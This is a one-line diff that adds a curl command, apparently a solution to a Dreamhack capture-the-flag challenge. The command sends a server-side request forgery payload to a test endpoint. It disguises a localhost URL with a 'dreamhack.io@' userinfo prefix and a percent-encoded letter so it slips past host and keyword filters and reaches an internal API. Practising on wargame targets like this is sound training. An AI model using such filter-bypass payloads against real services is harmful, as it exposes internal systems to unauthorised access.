@@ -1,0 +1,1 @@
+curl -X POST host1.dreamhack.games:PORT/api/v1/test/curl --form "url=http://dreamhack.io@localhost:8000/api/v1/test/interna%6c"
